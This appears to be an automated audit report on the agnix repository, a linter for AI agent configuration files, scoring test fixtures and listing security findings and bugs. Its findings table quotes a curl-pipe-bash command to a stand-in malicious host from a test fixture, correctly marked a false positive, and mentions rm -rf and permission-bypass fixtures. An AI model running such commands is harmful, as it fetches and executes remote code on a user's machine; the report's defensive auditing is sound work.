# NLPM Audit: agent-sh/agnix
**Date**: 2026-04-06  |  **Artifacts**: 100  |  **Strategy**: progressive
**NL Score**: 64/100
**Security**: REVIEW
**Bugs**: 37  |  **Quality Issues**: 89  |  **Security Findings**: 6

> **Note on fixture files**: ~80% of audited artifacts are intentional test fixtures under
> `tests/fixtures/invalid/` and `tests/fixtures/copilot-invalid/`. Their defects are by
> design — they exist to verify the agnix linter detects the errors. Bugs in those files
> are flagged for completeness but are **not** PR-worthy. Production bugs (plugin/, skills/)
> are highlighted separately.

## NL Score Summary
| File | Type | Score | Top Issue |
|------|------|-------|-----------|
| tests/fixtures/copilot-invalid/.github/agents/missing-description.agent.md | agent | 20 | Missing name (-25) + missing description (-25) |
| tests/fixtures/invalid/agents/missing-frontmatter.md | agent | 20 | No frontmatter — name and description absent |
| tests/fixtures/skills/missing-frontmatter/SKILL.md | skill | 20 | No frontmatter — name and description absent |
| tests/fixtures/invalid/hooks/dangerous-commands/settings.json | hooks | 20 | curl-pipe-bash + rm -rf (test fixture) |
| tests/fixtures/invalid/hooks/mcp_tool_missing_fields.json | hooks | 50 | mcp_tool missing required server and tool fields |
| tests/fixtures/invalid/hooks/missing-type-field/settings.json | hooks | 50 | Hook objects missing required type field |
| tests/fixtures/copilot-invalid/.github/hooks/hooks.json | hooks | 55 | Invalid event name "notRealEvent" |
| tests/fixtures/invalid/hooks/unknown-hook-type/settings.json | hooks | 55 | Unknown hook type "webhook" |
| tests/fixtures/invalid/hooks/missing-prompt-field/settings.json | hooks | 55 | prompt type missing required prompt field |
| tests/fixtures/invalid/hooks/missing-command-field/settings.json | hooks | 55 | command type missing required command field |
| tests/fixtures/copilot/.github/agents/reviewer.agent.md | agent | 45 | Missing name (-25) |
| tests/fixtures/copilot-too-long/.github/agents/too-long.agent.md | agent | 45 | Missing name (-25) |
| tests/fixtures/copilot-invalid/.github/agents/invalid-target.agent.md | agent | 45 | Missing name (-25) + invalid target "desktop" |
| tests/fixtures/copilot-invalid/.github/agents/invalid-infer-type.agent.md | agent | 45 | Missing name (-25) + infer: "auto" (string, not bool) |
| tests/fixtures/copilot-invalid/.github/agents/unknown-field.agent.md | agent | 45 | Missing name (-25) + unknown field "mystery-field" |
| tests/fixtures/copilot-invalid/.github/agents/unsupported-fields.agent.md | agent | 45 | Missing name (-25) + model: gpt-4.1 (not Claude) |
| tests/fixtures/copilot-invalid/.github/agents/invalid-infer-null.agent.md | agent | 45 | Missing name (-25) + infer: null (invalid type) |
| tests/fixtures/invalid/agents/missing-description.md | agent | 50 | Missing description (-25) |
| tests/fixtures/invalid/agents/missing-name.md | agent | 50 | Missing name (-25) |
| tests/fixtures/invalid/hooks/missing-matcher/settings.json | hooks | 60 | PreToolUse hooks missing required matcher field |
| tests/fixtures/invalid/hooks/script-not-found/settings.json | hooks | 60 | References missing scripts (nonexistent-hook.sh, missing-logger.py) |
| tests/fixtures/invalid/hooks/invalid-event/settings.json | hooks | 60 | "InvalidEvent" and "pretooluse" (wrong case) events |
| tests/fixtures/cross_platform/conflicting-tools/CLAUDE.md | memory | 60 | allowed-tools in prose (not frontmatter); cross-platform conflict |
| tests/fixtures/invalid/skills/deploy-prod/SKILL.md | skill | 65 | Description "Deploys to production" not a trigger phrase |
| tests/fixtures/invalid/hooks/async-on-non-command/settings.json | hooks | 65 | async: true on prompt/agent types (only valid on command) |
| tests/fixtures/invalid/hooks/prompt-missing-arguments/settings.json | hooks | 65 | Only one of two prompt hooks carries $ARGUMENTS |
| tests/fixtures/invalid/hooks/matcher-on-wrong-event/settings.json | hooks | 65 | Matcher on Stop/SubagentStop/UserPromptSubmit (no-op) |
| tests/fixtures/invalid/hooks/invalid-timeout/settings.json | hooks | 65 | Timeout 0 (too low) and 120 (exceeds 60s max) |
| tests/fixtures/invalid/hooks/once-in-settings/settings.json | hooks | 65 | "once" field not supported in settings.json hooks |
| tests/fixtures/invalid/hooks/matcher-on-ignored-event/settings.json | hooks | 65 | Matcher on events that silently ignore it |
| tests/fixtures/invalid/hooks/model-on-command/settings.json | hooks | 65 | model field on command type (unsupported) |
| tests/fixtures/invalid/hooks/deprecated-setup-event/settings.json | hooks | 65 | Uses deprecated "Setup" event |
| tests/fixtures/invalid/hooks/prompt-on-wrong-event/settings.json | hooks | 65 | prompt type on SessionStart/Notification (not allowed) |
| tests/fixtures/cross_platform/no-precedence/CLAUDE.md | memory | 65 | Minimal; Claude-specific content, no multi-tool guidance |
| tests/fixtures/cross_platform/conflicting-commands/CLAUDE.md | memory | 65 | Minimal; commands not structured for multi-tool context |
| tests/fixtures/real-world/html5-void-elements/CLAUDE.md | memory | 65 | Minimal instruction file (real-world parse test) |
| tests/fixtures/real-world/type-parameters/CLAUDE.md | memory | 65 | Minimal instruction file (real-world parse test) |
| tests/fixtures/invalid/hooks/no-timeout/settings.json | hooks | 70 | Command hook missing timeout (quality) |
| tests/fixtures/invalid/agents/tool-conflict.md | agent | 70 | Bash in both tools and disallowedTools |
| tests/fixtures/invalid/agents/invalid-hooks.md | agent | 70 | Invalid hook event "BadEvent" |
| tests/fixtures/invalid/agents/invalid-memory.md | agent | 70 | memory: "global" (invalid scope) |
| tests/fixtures/invalid/agents/bypass-permissions.md | agent | 70 | permissionMode: bypassPermissions (dangerous) |
| tests/fixtures/invalid/agents/invalid-permission.md | agent | 70 | permissionMode: "admin" (invalid value) |
| tests/fixtures/invalid/agents/missing-skill.md | agent | 70 | References non-existent skill "nonexistent-skill" |
| tests/fixtures/invalid/agents/invalid-tool-name.md | agent | 70 | Unknown tools: UnknownTool, FakeRead |
| tests/fixtures/invalid/agents/invalid-skill-format.md | agent | 70 | Skill names not kebab-case: MySkill, has_underscore |
| tests/fixtures/invalid/agents/invalid-disallowed-tool.md | agent | 70 | Unknown disallowed tool: NotARealTool |
| tests/fixtures/invalid/gemini-agents/.gemini/agents/broken.md | agent | 70 | Invalid MCP auth type "basic-auth" |
| tests/fixtures/cursor-invalid/agent-cur014/.cursor/agents/reviewer.md | agent | 70 | PascalCase name, numeric description, readonly: "true" (string) |
| tests/fixtures/valid/skills/code-review/SKILL.md | skill | 70 | No model (-5), no output format (-10), no examples (-15) |
| tests/fixtures/valid/skills/with-hooks/SKILL.md | skill | 70 | No model (-5), no output format (-10), no examples (-15) |
| tests/fixtures/valid/skills/fork-with-instructions/SKILL.md | skill | 70 | No model (-5), no output format (-10), no examples (-15) |
| tests/fixtures/valid/skills/with-custom-agent/SKILL.md | skill | 70 | No model (-5), no output format (-10), no examples (-15) |
| tests/fixtures/valid/skills/with-argument-hint/SKILL.md | skill | 70 | No model (-5), no output format (-10), no examples (-15) |
| tests/fixtures/valid/skills/deploy-prod/SKILL.md | skill | 70 | No model (-5), no output format (-10), no examples (-15) |
| tests/fixtures/invalid/skills/invalid-hooks/SKILL.md | skill | 70 | Invalid hook event "InvalidEvent"; no model, no examples |
| tests/fixtures/invalid/skills/invalid-context/SKILL.md | skill | 70 | context: "split" (invalid value) |
| tests/fixtures/invalid/skills/first-person-description/SKILL.md | skill | 70 | Description uses "you need" (second-person); no model |
| tests/fixtures/invalid/skills/string-boolean-disable/SKILL.md | skill | 70 | disable-model-invocation: "true" (string, must be bool) |
| tests/fixtures/invalid/skills/vague-name/SKILL.md | skill | 70 | Name "helper" is vague/non-specific |
| tests/fixtures/invalid/skills/unknown-frontmatter-field/SKILL.md | skill | 70 | Typo field "desription" (extra key) |
| tests/fixtures/invalid/skills/invalid-agent/SKILL.md | skill | 70 | Agent name "Invalid_Agent" has underscore |
| tests/fixtures/invalid/skills/fork-no-instructions/SKILL.md | skill | 70 | Fork context but body is reference docs, not instructions |
| tests/fixtures/invalid/skills/indexed-arguments-no-hint/SKILL.md | skill | 70 | Uses $ARGUMENTS[0] without argument-hint field |
| tests/fixtures/invalid/skills/argument-hint-no-args/SKILL.md | skill | 70 | argument-hint declared but body never uses $ARGUMENTS |
| tests/fixtures/invalid/skills/agent-without-context/SKILL.md | skill | 70 | agent: Explore without context: fork |
| tests/fixtures/invalid/skills/unknown-tool/SKILL.md | skill | 70 | allowed-tools includes FakeTool, UnknownTool |
| tests/fixtures/invalid/skills/context-without-agent/SKILL.md | skill | 70 | context: fork without agent field |
| tests/fixtures/invalid/skills/too-many-injections/SKILL.md | skill | 70 | 4 dynamic injections (!`) exceed 3-injection limit |
| tests/fixtures/invalid/skills/string-boolean-invocable/SKILL.md | skill | 70 | user-invocable: "false" (string, must be bool) |
| tests/fixtures/invalid/skills/name-directory-mismatch/SKILL.md | skill | 70 | name: directory-helper doesn't match directory name |
| tests/fixtures/invalid/skills/unreachable-skill/SKILL.md | skill | 70 | user-invocable: false + disable-model-invocation: true (unreachable) |
| tests/fixtures/skills/windows-path/SKILL.md | skill | 70 | Body uses Windows-style backslash path |
| tests/fixtures/skills/deep-reference/SKILL.md | skill | 70 | Deep path reference (portability concern) |
| tests/fixtures/per_client_skills/.github/skills/test-skill/SKILL.md | skill | 70 | agent field unsupported by GitHub Copilot |
| tests/fixtures/per_client_skills/.roo/skills/test-skill/SKILL.md | skill | 70 | disable-model-invocation unsupported by Roo Code |
| tests/fixtures/per_client_skills/.agents/skills/test-skill/SKILL.md | skill | 70 | hooks field unsupported by Codex CLI |
| tests/fixtures/per_client_skills/.opencode/skills/test-skill/SKILL.md | skill | 70 | argument-hint unsupported by OpenCode |
| tests/fixtures/per_client_skills/.windsurf/skills/test-skill/SKILL.md | skill | 70 | user-invocable unsupported by Windsurf |
| tests/fixtures/valid/gemini-agents/.gemini/agents/spanner.md | agent | 70 | No model (-5), no output format (-10), no examples (-15) |
| tests/fixtures/invalid/agents/invalid-model.md | agent | 75 | model: gpt-4 (invalid for Claude Code) |
| tests/fixtures/valid/agents/valid-agent.md | agent | 75 | No output format (-10), no examples (-15) |
| tests/fixtures/valid/agents/agent-complete-valid.md | agent | 75 | No output format (-10), no examples (-15) |
| tests/fixtures/valid/agents/agent-with-new-fields.md | agent | 75 | No output format (-10), no examples (-15) |
| tests/fixtures/cursor/.cursor/agents/reviewer.md | agent | 75 | No output format (-10), no examples (-15) |
| tests/fixtures/cursor-invalid/agent-cur015/.cursor/agents/reviewer.md | agent | 75 | No output format (-10), empty body |
| tests/fixtures/valid/skills/with-context-agent/SKILL.md | skill | 75 | No output format (-10), no examples (-15) |
| tests/fixtures/valid/skills/with-model/SKILL.md | skill | 75 | No output format (-10), no examples (-15) |
| tests/fixtures/invalid/skills/invalid-model/SKILL.md | skill | 75 | model: gpt-4 (invalid) |
| tests/fixtures/invalid/skills/invalid-name/SKILL.md | skill | 75 | name: invalid_name (underscore) |
| tests/fixtures/per_client_skills/.cline/skills/test-skill/SKILL.md | skill | 75 | model unsupported by Cline |
| tests/fixtures/per_client_skills/.cursor/skills/test-skill/SKILL.md | skill | 75 | model+context+agent unsupported by Cursor |
| tests/fixtures/per_client_skills/.kiro/skills/test-skill/SKILL.md | skill | 75 | model unsupported by Kiro |
| tests/fixtures/valid/hooks/settings.json | hooks | 90 | No issues (valid fixture) |
| tests/fixtures/valid/hooks/mcp_tool_hook.json | hooks | 90 | No issues (valid fixture) |
| tests/fixtures/copilot/.github/hooks/hooks.json | hooks | 85 | Valid Copilot format; minimal |
| plugin/agents/agnix-agent.md | agent | 85 | No examples (-15) |
| skills/agnix/SKILL.md | skill | 90 | No model (-5), partial examples (-5) |
| plugin/skills/agnix/SKILL.md | skill | 90 | No model (-5), partial examples (-5) |
| plugin/commands/agnix.md | command | 95 | Stale rule count ("405" vs actual 414); no interaction examples |

## Security Scan
| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 1 |
| Medium | 4 |
| Low | 0 |

### Execution Surface Inventory
| Surface | Files |
|---------|-------|
| Hooks | tests/fixtures/valid/hooks/settings.json, tests/fixtures/valid/hooks/mcp_tool_hook.json (+ 21 fixture hooks files) |
| Scripts | scripts/download.sh, scripts/run.sh, scripts/setup-hooks.sh, scripts/sync-versions.sh, scripts/check-tool-releases.sh, scripts/bench.sh, scripts/check-locale-sync.sh, scripts/check-rule-counts.py, scripts/generate-docs-rules.py, scripts/real-world-validate.py, scripts/validate-evidence-links.py, scripts/glm-extract.js, npm/index.js, npm/install.js, npm/test/test.js, editors/vscode/esbuild.js, website/docusaurus.config.js, website/plugins/wasm-plugin.js, website/sidebars.js, website/src/pages/index.js, website/src/pages/playground/index.js (+ scripts/sync-rule-bookkeeping.js) |
| MCP configs | None found |
| Package manifests | npm/package.json, editors/vscode/package.json, website/package.json |

### Security Findings
| # | Severity | File | Line | Pattern | Description |
|---|----------|------|------|---------|-------------|
| 1 | high | npm/package.json | 41 | SEC-postinstall-script | postinstall: "node install.js" — executes automatically during `npm install`; downloads platform binary from GitHub releases without checksum verification |
| 2 | medium | scripts/download.sh | 116,135 | SEC-unverified-download | curl downloads binary from GitHub releases without SHA256/GPG checksum verification; GITHUB_TOKEN used for auth but no artifact integrity check |
| 3 | medium | npm/install.js | 153 | SEC-unverified-download | https.get downloads binary from GitHub releases without checksum verification before extracting and chmod +x |
| 4 | medium | scripts/check-tool-releases.sh | 107 | SEC-external-network-call | curl -sL to html_url values loaded from .github/tool-release-baselines.json; URL source is config-controlled but external fetch with no content validation |
| 5 | medium | scripts/glm-extract.js | 207 | SEC-external-api-call | stdin content (up to 80K chars, potentially from external repos) sent to third-party GLM API at api.z.ai; API key via GLM_API_KEY env var; no data-sanitization before exfiltration |
| 6 | critical | tests/fixtures/invalid/hooks/dangerous-commands/settings.json | 8 | SEC-curl-pipe-sh | `curl https://malicious.com/script.sh \| bash` — **FALSE POSITIVE**: this is a deliberately-dangerous test fixture designed to verify the agnix dangerous-command rule fires; not production code |

## Bugs (PR-worthy)
Only production files — fixture bugs are intentional and are excluded from this table.

| # | File | Issue | Impact |
|---|------|-------|--------|
| 1 | plugin/.claude-plugin/plugin.json | version: "0.16.1" while npm/package.json is "0.20.0" | Plugin installs outdated version metadata; could confuse marketplace tooling |
| 2 | plugin/commands/agnix.md | description says "405 rules" but CLAUDE.md and npm 0.20.0 have 414 rules | Stale rule count shown to users in skill descriptions |
| 3 | plugin/skills/agnix/SKILL.md | description says "405 rules across 10+ AI tools" (stale) | Same stale count as above, different distribution path |
| 4 | skills/agnix/SKILL.md | description says "405 rules" (stale) | Users of the root skills/ path see incorrect count |
| 5 | plugin/skills/agnix/SKILL.md | no allowed-tools declared; root skills/agnix/SKILL.md declares Bash(agnix:*),Bash(cargo:*),Read,Glob,Grep | Plugin version lacks tool restrictions; may run with broader permissions than intended |

## Security Fixes (PR-worthy, Medium/Low only)
| # | File | Issue | Suggested Fix |
|---|------|-------|---------------|
| 1 | scripts/download.sh | Binary downloaded without checksum verification | Download matching `.sha256` sidecar from GitHub release, verify with `sha256sum -c` before extraction |
| 2 | npm/install.js | Binary downloaded without checksum verification | Embed expected SHA256 per-version in package.json or fetch a checksums file; verify before chmod +x |
| 3 | scripts/glm-extract.js | stdin content from external repos sent to third-party GLM API | Document in CI setup that GLM_API_KEY enables sending repo content externally; add warning log when exfiltrating |

## Quality Issues (informational)
| # | File | Issue | Penalty |
|---|------|-------|---------|
| 1 | All agent fixtures (20+) | No output format specified | -10 each |
| 2 | All agent fixtures (20+) | No example blocks | -15 each |
| 3 | Most agent fixtures | No model declared | -5 each |
| 4 | All skill fixtures (39) | No output format specified | -10 each |
| 5 | All skill fixtures (39) | No example blocks | -15 each |
| 6 | Most skill fixtures | No model declared | -5 each |
| 7 | tests/fixtures/invalid/skills/vague-name/SKILL.md | Name "helper" is too generic | -0 (rubric deducts for vague words in body; vague name is structural) |
| 8 | tests/fixtures/invalid/skills/deploy-prod/SKILL.md | Description "Deploys to production" not a trigger phrase ("Use when...") | -2 |
| 9 | plugin/agents/agnix-agent.md | No example blocks showing expected interaction | -15 |
| 10 | plugin/commands/agnix.md | No agent-style interaction examples (code blocks present, not example turns) | -5 |
| 11 | skills/agnix/SKILL.md | No model declared | -5 |
| 12 | plugin/skills/agnix/SKILL.md | No model declared | -5 |
| 13 | tests/fixtures/cursor-invalid/agent-cur015/.cursor/agents/reviewer.md | Empty body; no instructions | -10 |

## Cross-Component
- **Version drift**: `plugin/.claude-plugin/plugin.json` is at version `0.16.1`; `npm/package.json` is `0.20.0`. The plugin metadata is 4 minor versions behind. This breaks the expected invariant that both manifests track together.
- **Stale rule count**: `plugin/commands/agnix.md`, `plugin/skills/agnix/SKILL.md`, and `skills/agnix/SKILL.md` all cite "405 rules" while `CLAUDE.md` documents 414 rules and the codebase tracks `v0.20.0`. The `scripts/sync-rule-bookkeeping.js` script exists to fix this but was not run on the plugin skill files.
- **Skills divergence**: `plugin/skills/agnix/SKILL.md` has `argument-hint` but no `allowed-tools`; `skills/agnix/SKILL.md` has `allowed-tools` but no `argument-hint`. These two distributions of the same skill have complementary missing fields; neither is complete.
- **No broken references** in production agents/commands beyond the stale rule count.
- **Test fixture coverage**: 29 agent fixtures, 41 skill fixtures, and 23 hook fixtures are present and appear to comprehensively cover the validation rules documented in VALIDATION-RULES.md. No orphaned fixtures detected.

## Recommendation
REVIEW — submit NL fix PRs for the 5 production bugs (version bump in plugin.json, rule count sync in 3 skill files, allowed-tools in plugin skill). Flag the HIGH security finding (postinstall binary download without checksum) in a GitHub issue for the maintainer to evaluate adding checksum verification. The curl-pipe-bash critical pattern is a false positive from a test fixture and requires no action.
